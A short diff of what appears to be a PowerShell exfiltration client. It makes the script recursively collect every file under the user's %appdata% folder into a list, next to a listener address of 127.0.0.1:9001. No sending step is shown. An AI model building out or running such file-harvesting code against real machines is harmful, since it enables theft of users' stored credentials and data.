@@ -1,7 +1,8 @@
-$fileList = "Exfil-client.ps1"
 $folder = "%appdata%"
+cd $folder
+$fileList = @($(ls -1 -R $folder))
 
-$exfilList = @($(ls -1 -R $folder))
+$exfilList = @()
 
 $IP="127.0.0.1:9001"
 
